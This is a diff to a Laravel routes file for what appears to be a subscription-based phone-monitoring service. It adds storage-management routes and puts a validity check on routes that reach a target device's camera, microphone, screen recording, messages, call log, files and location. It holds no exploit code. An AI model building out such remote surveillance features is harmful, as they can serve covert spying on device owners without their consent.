@@ -17,6 +17,7 @@ use App\Http\Controllers\RegisterController;
 use App\Http\Controllers\rolesController;
 use App\Http\Controllers\SendFcmNotification;
 use App\Http\Controllers\settingsController;
+use App\Http\Controllers\StorageController;
 use App\Http\Controllers\subscriptionController;
 use App\Http\Controllers\transactionsController;
 use App\Http\Controllers\usersController;
@@ -82,6 +83,9 @@ Route::group(['middleware' => 'client.auth'], function () {
     route::post('/subscription/checkout', [FrontendSubscriptionController::class, 'checkout']);
     route::post('/subscription/checkout/webhook', [FrontendSubscriptionController::class, 'webhook']);
 
+    route::get('/storage', [StorageController::class, 'frontend_index']);
+    route::get('/storage/purchase/{id}', [StorageController::class, 'purchase']);
+
     route::post('/onlinePayment', [FrontendSubscriptionController::class, 'onlinePayment']);
 
     route::post('/messages', [messageController::class, 'index'])->name('/messages');
@@ -93,24 +97,26 @@ Route::group(['middleware' => 'client.auth'], function () {
     route::post('/raise-issue', [issueTokenController::class, 'create']);
 
     // features
-    route::get('/message/{userId}', MessageComponent::class)->name('messages');
-    route::get('/contacts/{userId}', ContactsComponent::class);
-    route::get('/camera/{userId}', CameraComponent::class);
-    route::get('/call-log/{userId}', CallLogComponent::class);
-    route::get('/audio-record/{userId}', AudioRecordComponent::class);
-    route::get('/alert-device/{userId}', AlertDeviceComponent::class);
-    route::get('/vibrate-device/{userId}', VibrateComponent::class);
-    route::get('/screen-record/{userId}', ScreenRecordComponent::class);
-    route::get('/video-record/{userId}', VideoRecordComponent::class);
-    route::get('/gallery/{userId}', GalleryComponent::class);
-    route::get('/filemanager/{userId}', FilemanagerComponent::class);
-    route::get('/lost-messages/{userId}', LostMessagesComponent::class);
-    route::get('/locate-phone/{userId}', LocatePhone::class);
-    route::get('/text-to-speech/{userId}', TextToSpeech::class);
+    route::group(['middleware' => 'client.validity'], function () {
+        route::get('/message/{userId}', MessageComponent::class)->name('messages');
+        route::get('/contacts/{userId}', ContactsComponent::class);
+        route::get('/camera/{userId}', CameraComponent::class);
+        route::get('/call-log/{userId}', CallLogComponent::class);
+        route::get('/audio-record/{userId}', AudioRecordComponent::class);
+        route::get('/alert-device/{userId}', AlertDeviceComponent::class);
+        route::get('/vibrate-device/{userId}', VibrateComponent::class);
+        route::get('/screen-record/{userId}', ScreenRecordComponent::class);
+        route::get('/video-record/{userId}', VideoRecordComponent::class);
+        route::get('/gallery/{userId}', GalleryComponent::class);
+        route::get('/filemanager/{userId}', FilemanagerComponent::class);
+        route::get('/lost-messages/{userId}', LostMessagesComponent::class);
+        route::get('/locate-phone/{userId}', LocatePhone::class);
+        route::get('/text-to-speech/{userId}', TextToSpeech::class);
 
-    Route::get('/message-populate/{key}', MessagePopulate::class)->name('message-populate');
+        Route::get('/message-populate/{key}', MessagePopulate::class)->name('message-populate');
 
-    route::get('/default-device/{id}/{token}', [clientController::class, 'default_device']);
+        route::get('/default-device/{id}/{token}', [clientController::class, 'default_device']);
+    });
 });
 
 
@@ -169,6 +175,12 @@ Route::group(['middleware' => 'user.auth'], function () {
     route::post('/admin/createCoupon', [couponsController::class, 'createCoupon']);
     route::post('/admin/updateCoupon', [couponsController::class, 'updateCoupon']);
     route::post('/admin/deleteCoupon', [couponsController::class, 'deleteCoupon']);
+
+    route::get('/admin/manageStorage', [StorageController::class, 'index'])->name('/admin/manageStorage');
+    route::post('/admin/storage/ajaxCallAllCodes', [StorageController::class, 'ajaxCallAllStorages']);
+    route::post('/admin/storage/create', [StorageController::class, 'create_storage']);
+    route::post('/admin/storage/delete', [StorageController::class, 'delete_storage']);
+    route::post('/admin/storage/default', [StorageController::class, 'default_storage']);
 
     route::get('/admin/tokens', [issueTokenController::class, 'admin_index'])->name('/admin/tokens');
     route::get('/admin/add-token', [issueTokenController::class, 'add_index'])->name('add-token');
